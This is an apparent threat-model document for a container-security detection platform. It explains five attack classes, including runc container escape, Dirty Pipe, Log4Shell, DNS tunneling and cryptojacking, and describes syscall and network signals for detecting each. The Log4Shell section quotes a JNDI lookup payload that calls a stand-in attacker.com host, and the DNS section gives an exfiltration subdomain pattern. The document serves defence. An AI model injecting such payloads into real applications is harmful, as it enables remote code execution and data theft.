Project Sentinel: Threat Model & Security Analysis

1. Introduction
This document outlines the threat model for Project Sentinel. Its purpose is to identify and analyze potential security threats in modern cloud-native environments, which in turn informs the design, eBPF probe placement, and AI model feature engineering of the platform.

Our threat analysis focuses on attacks that subvert the trust boundaries between containers, the host kernel, and the network. Sentinel is specifically designed to detect the behavioral artifacts of these exploits, even when the specific vulnerability (the CVE) is unknown (a zero-day).

2. Real-World Attack Vectors & Sentinel's Detection Strategy
Below are five real-world CVEs that represent classes of attacks Sentinel is designed to mitigate.

2.1 Container Escape via Runc Vulnerability

CVE: CVE-2019-5736

Class: Container Escape to Host Privilege Escalation

Attack Vector: This vulnerability allowed a malicious container to overwrite the runc binary on the host system. When a privileged user or process later executes docker exec into the malicious container, the compromised runc binary is executed on the host with root privileges, granting the attacker full control over the host node.

Sentinel's Detection Strategy:

Anomalous openat Syscall: Sentinel's eBPF probes monitor openat syscalls. The core of this attack is a process inside a container attempting to open /proc/self/exe (which points to the runc binary on the host) with write permissions (O_WRONLY).

Behavioral Anomaly: The AI model, having been trained on billions of legitimate events, will recognize that a containerized application process never legitimately opens the container runtime binary for writing. This sequence (container_process -> openat("/proc/self/exe", O_WRONLY)) is a massive deviation from the learned baseline and would be flagged with a critical anomaly score.

2.2 Kernel Privilege Escalation via "Dirty Pipe"

CVE: CVE-2022-0847

Class: Kernel Privilege Escalation

Attack Vector: "Dirty Pipe" allowed an unprivileged process to overwrite data in arbitrary read-only files, including privileged files like /etc/passwd or SUID binaries. The attack involves manipulating page caches using pipe() and splice() syscalls in a specific, non-standard sequence.

Sentinel's Detection Strategy:

Anomalous Syscall Sequence: The power of Sentinel's transformer model is its ability to understand sequences, not just individual syscalls. The specific, unusual sequence of pipe(), splice(), and file manipulations is the primary indicator.

Contextual Deviation: An application server, for instance, has a predictable pattern of syscalls related to network I/O and file reads. The sudden introduction of low-level splice() and pipe() operations, combined with attempts to write to a normally read-only system file, creates a highly anomalous sequence that the model will detect.

2.3 Remote Code Execution via Log4Shell

CVE: CVE-2021-44228

Class: Remote Code Execution (RCE)

Attack Vector: A vulnerable Java application using Log4j receives a malicious string (e.g., ${jndi:ldap://attacker.com/a}). The application contacts the attacker's LDAP server, which responds with a payload that causes the application to download and execute a malicious Java class. This leads to a reverse shell or further compromise.

Sentinel's Detection Strategy:

Anomalous Network Egress: Sentinel's network probes observe all outbound connections. A Java application server suddenly making an outbound LDAP connection to an unknown, untrusted IP address is a major red flag. The AI model's baseline for the service would show no history of such traffic.

Anomalous Process Execution (execve): The final stage of the attack involves the Java process spawning a new shell (e.g., /bin/bash, sh -c). The AI model knows that a Java application server process should never be a parent to a shell process. This parent-child relationship (java -> /bin/bash) is a classic indicator of RCE and would be flagged as a critical anomaly.

2.4 Data Exfiltration via DNS Tunneling

CVE: N/A (Technique-based)

Class: Data Exfiltration / Command & Control (C2)

Attack Vector: An attacker who has gained initial access uses DNS queries to exfiltrate data. They encode stolen data into subdomains (e.g., [base64-encoded-data].attacker.com) and make DNS requests. Legitimate firewalls often allow DNS traffic, making this a stealthy exfiltration channel.

Sentinel's Detection Strategy:

Network Traffic Analysis: Sentinel's network probes analyze not just connections but also DNS query patterns. The AI model will learn the baseline for normal DNS traffic (e.g., query volume, domain entropy).

Anomalous Query Patterns: DNS tunneling generates high-volume, high-entropy DNS queries to a single domain. The model will flag this statistical and behavioral deviation from the service's normal DNS activity (which might be limited to a few queries for database hostnames or public APIs).

2.5 Cryptojacking / Resource Hijacking

CVE: N/A (Technique-based)

Class: Resource Abuse

Attack Vector: A compromised container or pod begins running cryptocurrency mining software. This is often characterized by sustained high CPU usage and network connections to known mining pool domains.

Sentinel's Detection Strategy:

Anomalous execve and Network Behavior: A web server pod, for example, suddenly executes a process named xmrig or a similar unknown binary. This new process then makes long-lived, sustained network connections to IP addresses associated with mining pools.

Combined Anomaly Score: Sentinel's AI model correlates these events. The execution of an unknown binary, combined with anomalous network patterns and sustained resource usage (via Prometheus integration), creates a composite anomaly score that clearly points to cryptojacking.